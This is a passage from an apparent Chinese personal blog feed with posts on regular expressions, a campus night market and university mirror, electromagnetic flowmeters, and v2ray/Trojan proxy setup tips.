\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*\&gt;(?:(?:\r\n)?[\t])*)(?:,\s*(?:(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*|(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)*\&lt;(?:(?:\r\n)?[\t])*(?:@(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*(?:,@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*)*:(?:(?:\r\n)?[\t])*)?(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*\&gt;(?:(?:\r\n)?[\t])*))*)?;\s*)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>我反正看不懂，让我再改点什么我也改不动。别说这种，就是我看我自己以前写的正则，时间一长都看不懂了。</p>
<p>有一些写法，比如Verbose Mode, 写起来会可读性强一点。</p>
<h2 id="性能问题">性能问题</h2>
<p>大部分正则库的实现貌似用的都是有限自动机。</p>
<p>似乎Perl的很快，javascript的要慢很多。</p>
<p>贪婪匹配之类的东西写多了就会卡死，</p>
<h2 id="用法">用法</h2>
<h3 id="防止过度匹配">防止过度匹配</h3>
<p>使用? 比如</p>
<pre class="line-numbers language-none"><code class="language-none">* 改为 *?

匹配\&lt;b\&gt;标签:

&lt;[Bb]&gt;.*?&lt;/[Bb]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="单词边界">单词边界</h3>
<p>使用不匹配边界使用,比如  匹配字符串使用^元字符</p>
<h3 id="子表达式">子表达式</h3>
<p>使用(),例如</p>
<pre class="line-numbers language-regex" data-language="regex"><code class="language-regex"><span class="token group punctuation">(</span>&amp;nbsp;<span class="token group punctuation">)</span><span class="token quantifier number">{2,}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>匹配两个非换行空格</p>
<h3 id="回溯引用">回溯引用</h3>
<p>使用\1, 匹配一对html标签:</p>
<pre><code>\&lt;H1&gt;\&lt;/H1&gt;使用
&lt;Hh([1-6])&gt;.*?&lt;/[Hh]\1&gt; 匹配</code></pre>
<p>替换中也会用到\1 使用python的re库可以完成一些替换</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> repl<span class="token punctuation">,</span> string<span class="token punctuation">,</span> count<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里重新排版电话号码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re

phone <span class="token operator">=</span> <span class="token string">"123-456-7890"</span>

<span class="token comment"># 将电话号重新排版为(123) 456-7890</span>
num <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r"(\d{3})(-)(\d{3})(-)(\d{4})"</span><span class="token punctuation">,</span> <span class="token string">r"(\1) \3-\5"</span><span class="token punctuation">,</span> phone<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"phone-number: "</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果</p>
<pre class="line-numbers language-none"><code class="language-none">phone-number:  (123) 456-7891<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="前向查找">前向查找</h3>
<p>使用?=进行前向查找,?&lt;=向后查找</p>
<p>比如,从<code>https://zhangjk98.xyz/</code>中找出协议https:</p>
<pre class="line-numbers language-none"><code class="language-none">.+(?=:)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="一些坑">一些坑</h2>
<ol type="1">
<li>很多支持正则表达式的地方差异很大，有的甚至不支持完整的正则表达式，比如linux命令中grep，只支持Basic RegEx，像<code>? + () |</code>这种元字符全都不支持，需要用<code>-e</code>或<code>-P</code>参数使用扩展的正则或直接用Perl正则。Vim里面的正则也自己搞了一套，跟别的不太一样</li>
<li>win下面的空格和换行和linux下面不一样</li>
<li>懒惰匹配基本大部分正则库都是向后的，双向的懒惰匹配并没法用，比如<code>&lt;p&gt;.*?主诉.*?&lt;/p&gt;</code>并不能找出包含主诉的段落，实际上会找出从第一个p到包含主诉那个段落结束</li>
</ol>
<h2 id="参考">参考</h2>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ppaXNoYW5lZC9sZWFybi1yZWdleC9ibG9iL21hc3Rlci90cmFuc2xhdGlvbnMvUkVBRE1FLWNuLm1k">https://github.com/ziishaned/learn-regex/blob/master/translations/README-cn.md<i class="fa fa-external-link-alt"></i></span> 一个简短教程</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9yZWdleDEwMS5jb20v">https://regex101.com/<i class="fa fa-external-link-alt"></i></span> 在线练习和测试网站</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9yZWdleHIuY29tLw==">https://regexr.com/<i class="fa fa-external-link-alt"></i></span> 另一个网站，感觉功能比上面那个强，但只支持javascript和php</li>
</ol>
<h2 id="其他">其他</h2>
<p>等待填坑</p>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>沙河夜市</title>
    <url>/f641/</url>
    <content><![CDATA[<p>这几天走过泥电沙河边上的建设路，早上晨光熹微，夜间车马喧嚣，仿佛回到了高二高三在一中上学的日子。 <a id="more"></a></p>
<p>晚上路过建设路，卖小吃的沿街店铺生意似乎很火爆。到底还是网红街，比清水河西门外一片濒临倒闭的冷清店铺红火多了，显不出一点稳中向好共克时艰的样子。然而我这几天却没看到多少麻雀在路边找吃的，可能是人实在太多不太敢来吧。沙河校内倒是有些珠颈斑鸠和白颊噪鹛在路边捡樟树果子吃。鸟没看到，不到一周的时间却见了三次老鼠行色匆匆，穿梭在摊位间，可能是要回家养四个龟 不喜欢辣的我路过建设路，没有胃口，每次大晚上的走过去居然一点也不饿。</p>
<p>今天实习回来的师姐请我们吃螺蛳粉，不习惯嗦粉并不知道哪里好吃。 听说建设路吃的自从炒作过度就不如以前了，我也不晓得，反正没有市井气息，像旅游区。</p>
<p>浮世繁华，与我无关。 16年涨了房价的成都不像是那首不知道怎么火的《成都》，倒像是《北京北京》,居长安大不易。 咖啡馆离广场有三个街区，仿佛霓虹灯到月亮的距离，哦，不对，成都看不到月亮。</p>
<p>晚上回到租的房子，八二信箱家属区，老房子刷了一层屎黄色的漆，那感觉，和当年我长大的物探小区刷了一层红色的漆一样难受。我果然还是喜欢老小区。</p>
<p>成都夜雨，点点滴滴到天明</p>
<p><strong><em>对了，泥电的镜像源要上了，不来试试吗</em></strong> <span class="exturl" data-url="aHR0cDovL21pcnJvcnMudWVzdGMuY24=">电子科技大学开源镜像站<i class="fa fa-external-link-alt"></i></span> ~~202.115.22.207 ~~（需要校内IP） 电子科大镜像源自从凝聚的凉了以后终于要续上了</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ping</span> <span class="token number">202.115</span>.22.207

正在 Ping <span class="token number">202.115</span>.22.207 具有 <span class="token number">32</span> 字节的数据:
来自 <span class="token number">202.115</span>.22.207 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">=</span>2ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">60</span>
来自 <span class="token number">202.115</span>.22.207 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">&lt;</span>1ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">60</span>
来自 <span class="token number">202.115</span>.22.207 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">=</span>1ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">60</span>
来自 <span class="token number">202.115</span>.22.207 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">&lt;</span>1ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">60</span>

<span class="token number">202.115</span>.22.207 的 Ping 统计信息:
    数据包: 已发送 <span class="token operator">=</span> <span class="token number">4</span>，已接收 <span class="token operator">=</span> <span class="token number">4</span>，丢失 <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0</span>% 丢失<span class="token punctuation">)</span>，
往返行程的估计时间<span class="token punctuation">(</span>以毫秒为单位<span class="token punctuation">)</span>:
    最短 <span class="token operator">=</span> 0ms，最长 <span class="token operator">=</span> 2ms，平均 <span class="token operator">=</span> 0ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/mirrors.png" alt="Picture" style="zoom:80%;" /> <em>请忽略现在还妹有前端这个问题，据说已经在做了.jpg</em></p>
<p>更新，前端已经安排上了 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/mirrors1.png" alt="Picture" style="zoom:80%;" /></p>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
  </entry>
  <entry>
    <title>电磁流量计</title>
    <url>/8ca1/</url>
    <content><![CDATA[<p>电磁流量计是一种常用流速流量计，应用电磁感应原理， 根据导电流体通过外加磁场时感生的电动势来测量导电流体流量的一种仪器。电磁流量计适用于满管污水等强导电性液体流量测量，多用于工业污水检测等场合。 <a id="more"></a></p>
<h4 id="电磁流量计原理">电磁流量计原理</h4>
<p>常用流速流量计有测量导电液体的电磁流量计、采用超声波流量计时差法外夹式或者管段式超声波流量仪表、采用多普勒雷达测速原理或利用声波在流体中传播的多普勒效应的流速仪。</p>
<p>电磁流量计（Electromagnetic Flowmeters，简称EMF），是20世纪50~60年代随着电子技术的发展而迅速发展起来的流量测量仪表。 电磁流量计是应用电磁感应原理， 根据导电流体通过外加磁场时感生的电动势来测量导电流体流量的一种仪器。</p>
<p>传统电磁流量计测量原理如图1所示。 电磁线圈在直径为 d、横截面积为A的管道中产生一个磁场强度为B的磁场。当有流体经过 时会切割磁感线而产生感应电动势 U,测量电极接收电动势信号。由公式 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.798ex" xmlns="http://www.w3.org/2000/svg" width="12.195ex" height="2.835ex" role="img" focusable="false" viewBox="0 -900.3 5390.1 1253.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D444" d="M399 -80Q399 -47 400 -30T402 -11V-7L387 -11Q341 -22 303 -22Q208 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435Q740 255 592 107Q529 47 461 16L444 8V3Q444 2 449 -24T470 -66T516 -82Q551 -82 583 -60T625 -3Q631 11 638 11Q647 11 649 2Q649 -6 639 -34T611 -100T557 -165T481 -194Q399 -194 399 -87V-80ZM636 468Q636 523 621 564T580 625T530 655T477 665Q429 665 379 640Q277 591 215 464T153 216Q153 110 207 59Q231 38 236 38V46Q236 86 269 120T347 155Q372 155 390 144T417 114T429 82T435 55L448 64Q512 108 557 185T619 334T636 468ZM314 18Q362 18 404 39L403 49Q399 104 366 115Q354 117 347 117Q344 117 341 117T337 118Q317 118 296 98T274 52Q274 18 314 18Z"></path></g><g data-mml-node="mo" transform="translate(1068.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2124.6, 0)"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(227.4, 394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(220, -345) scale(0.707)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><rect width="568.4" height="60" x="120" y="220"></rect></g></g><g data-mml-node="mo" transform="translate(3155.2, 0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3877.4, 0)"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(220, 394) scale(0.707)"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mi" transform="translate(767, 0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g><g data-mml-node="mrow" transform="translate(304.1, -345) scale(0.707)"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mi" transform="translate(759, 0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g><rect width="1272.7" height="60" x="120" y="220"></rect></g></g></g></g></svg></mjx-container></span> 可计算其流量。式中:Q为流量;k为修正系数。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190830182933.png" alt="传统流量计"></p>
<p>电容式电磁流量计解决了电极表面附 着、腐蚀、摩擦等问题 ,其电极与被测流体间有绝缘 衬里隔离,或者直接采用绝缘测量管, 结构如图 2 所示。电极与被测流体通过绝缘管形成检测电容,通 过此电容来耦合流量信号。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190830183016.png" alt="对比"></p>
<h4 id="电磁流量计的优化改进">电磁流量计的优化改进</h4>
<p>普通的电磁流量计只能测量满管流的流量,常见的非满管电磁流量计有下面几种：</p>
<ol type="1">
<li>多电极式非满管电磁流量计。其底部是一对信号注入电极,中间有多对测量电极,顶端有一个满管电极。当流体非满管时,满管电极检测到管道非满状 态,利用算法修正测量值,此时流量计的测量方式改 成测量流体流速和液面高度。信号注入电极与在不同位置的三对测量电极共同工作,用于测量液位面的高度和流体的速度。</li>
<li>电容式非满管电磁流量计。电容式非满管电磁流量计就是利用液位的变化使 得电容的极距发生变化,通过测量发送电极和检测电 极之间的电容耦合值即可测量流量值。</li>
<li>利用阻抗或信号衰减研制的非满管电磁流量计。其结构是流量管底部贴一对信号发射电极,在流量管中间贴信号接收电极。由于信号在流体 中传播会产生衰减,且传播时间越长,衰减越多,因此 通过信号接收电极接收到的信号衰减量即可得知液面高度; <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190830183034.png"> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190830183044.png"> 励磁方式可以分为两种基本 形式,即采用交变磁场的形式(包括正弦波励磁、矩形 波励磁、三值波励磁和双频矩形波励磁) 和采用恒定 磁场的形式(包括直流电源励磁和永磁体励磁)。</li>
</ol>
<p>相对于交变磁场励磁方式来说,恒定磁场励磁的 方式实现起来更加简单,受工频干扰影响小,而且使用 恒定磁场励磁可以简化传感器结构</p>
<h4 id="电磁流量计与其他测流量原理仪器的比较">电磁流量计与其他测流量原理仪器的比较</h4>
<table>
<colgroup>
<col style="width: 21%">
<col style="width: 15%">
<col style="width: 21%">
<col style="width: 21%">
<col style="width: 21%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">产品名称</th>
<th style="text-align: left;">原理</th>
<th style="text-align: center;">优点</th>
<th style="text-align: center;">缺点</th>
<th style="text-align: center;">备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">电磁流量计</td>
<td style="text-align: left;">电磁感应</td>
<td style="text-align: center;">适合满管污水测量</td>
<td style="text-align: center;">不能测非满管污水和干净的水体</td>
<td style="text-align: center;">多适用于工业污水处理等场合，管径不同价格不同</td>
</tr>
<tr class="even">
<td style="text-align: left;">超声波流量计时差法</td>
<td style="text-align: left;">超声波时差</td>
<td style="text-align: center;">适合于干净水体的流量测量可以外贴在管道外侧</td>
<td style="text-align: center;">不能测非满管污水和中污以上的水体</td>
<td style="text-align: center;">多适用于供水等场合</td>
</tr>
<tr class="odd">
<td style="text-align: left;">超声波明渠流量计</td>
<td style="text-align: left;">水位换算流量</td>
<td style="text-align: center;">价格便宜，原理简单</td>
<td style="text-align: center;">需要修建堰槽且 对；水体有阻碍作用、精度较低</td>
<td style="text-align: center;">适合于小渠道等能够修建堰槽的场合，宽渠道或者非规则渠道无法使用</td>
</tr>
<tr class="even">
<td style="text-align: left;">雷达流速仪</td>
<td style="text-align: left;">多普勒效应</td>
<td style="text-align: center;">安装简单不易损坏</td>
<td style="text-align: center;">起始速度较高，无法测量流速较慢的水体，由于测量水表面的流速，容易受波浪影响</td>
<td style="text-align: center;">适合大江大河等流速较大或者安装要求简便的场合</td>
</tr>
<tr class="odd">
<td style="text-align: left;">多普勒超声流量计</td>
<td style="text-align: left;">多普勒效应</td>
<td style="text-align: center;">测量精度高，起始速度低，安装简便，能够测量非满管和不规则断面的流速流量</td>
<td style="text-align: center;">较宽的渠道需要多台设备同时使用</td>
<td style="text-align: center;">城市下水道、管网、灌区、河道、渠道水电站等</td>
</tr>
</tbody>
</table>
<h4 id="参考">参考</h4>
<ol type="1">
<li>AMARE T. Design of an electromagnetic flowmeter for insulating liquids[ J]. Measurement Science &amp; Technology, 1999, 10 ( 8 ): 755 - 758.</li>
<li>DONEY B. Going with partial flow[ J]. Control Engineering,1998, 45(12):131 - 133.</li>
<li>BERA, S. C., CHAKRABORTY, B.. A Novel Technique of Flow Measurement for a Conducting Liquid[J]. IEEE Transactions on Instrumentation and Measurement,2009,8(8).</li>
</ol>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>传感器</tag>
        <tag>电磁流量计</tag>
      </tags>
  </entry>
  <entry>
    <title>网上冲浪指北</title>
    <url>/87d6/</url>
    <content><![CDATA[<p>欢 度 国 庆 <a id="more"></a></p>
<h2 id="时隔一年的更新">时隔一年的更新</h2>
<p>由于这一篇写的太乱，我重新开了个坑，见<a href="https://zhangjk98.xyz/surfing-the-internet-2/">网上冲浪指北（二）</a>。这一篇已经过时，不用再看了。</p>
<h2 id="近况">近况</h2>
<p>听说9月16号风雨交加,电闪雷鸣，好多梯子集体。AWS的ip据说都被封了一批。 使用v2ray的我依然苟活，我这一阵使用体验是，ws+tls+cdn是最稳的。嫌麻烦可以直接ws，反正不建议v2ray用http伪装了，容易被制裁。最近我的MTproto也挂了，貌似最近telegram的专用代理被针对得很厉害。 另外建议避开美日港等线路。 备用应急找几个还勉强能用的备着，比如setup v某n</p>
<p>更新,kcptun,mkcp,finalspeed . GIA线路最好不要用。 最近ss和ssr大面积爆破，v2ray还能苟，不行直接上trojan。 使用aes加密基本都被搞，好像是ssr有混淆，墙无法识别，直接封。 祝你ping安</p>
<p>还是要保持优良传统,努力学习<del>元件耦合</del>计算机网络: &gt;大一的电路分析老师曾说过：“在文化大革命的时候，国家曾封锁电台。我们的同学们啊用自己的器件组装了一个电台，他能覆盖整个四川地区甚至云南和贵州也能收到。于是四川人民天天就听着成电广播，后来这事闹大了，办电台的同学要被批斗，还是周总理亲自来把这事压下去了。能做出那么好的电台，是元件耦合做得好，同学们，可见元件耦合有多么重要啊！”</p>
<p>另，移动网经常搞些dns劫持之类的动作，会造成一些干扰，我们参照这个配置 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3YycmF5L3YycmF5LWNvcmUvaXNzdWVzLzE4MDg=">https://github.com/v2ray/v2ray-core/issues/1808<i class="fa fa-external-link-alt"></i></span> 改一下服务器dns配置：</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"dns"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
<span class="token property">"server"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
<span class="token string">"8.8.8.8"</span><span class="token punctuation">,</span>
<span class="token string">"1.1.1.1"</span><span class="token punctuation">,</span>
<span class="token string">"localhost"</span>
<span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其实这个时候可以直接上dnscrypt解决问题</p>
<p>另外, v2ray的服务器和本地的时间一定要记得用ntp同步一下,不然两边时间不一样也会拒绝连接的</p>
<h2 id="trojan的方案">Trojan的方案</h2>
<p>原理和v2ray的websocket+TLS差不多，只在乎延迟和速度的话，Trojan比v2ray的websocket+TLS一般会快一点（其实大部分时候也就快了不到10%） 但是Trojan没有好的客户端（特别是安卓），路由器上折腾也没有特别好的方案 而且不支持CDN。</p>
<p>真追求速度也不太建议这个，理论上websocket肯定比KCP慢，折腾党可以试试。特殊时期可以留一条这样的备用线（备用防封），另一条线裸跑ss走大流量的，就差不多够了。</p>
<h2 id="更新">更新</h2>
<p>最近<span class="exturl" data-url="aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lL3ZtemowNC5wZGY=">基于长短期记忆网络的V2ray流量识别方法<i class="fa fa-external-link-alt"></i></span>好像在微博等地引起了小小的恐慌。这个大概就是解包后上神经网络之类的，和之前的一篇 <span class="exturl" data-url="aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL2RvY3VtZW50LzgwNDgxMTY=">https://ieeexplore.ieee.org/document/8048116<i class="fa fa-external-link-alt"></i></span> 步骤、程序都是一样的，就把随机森林换成了k近邻，高度怀疑是水论文。这个也就针对一下vmess、tcp，tls估计搞不定。</p>
<p>不过v2ray作者弃坑几个月了，不知道近况如何</p>
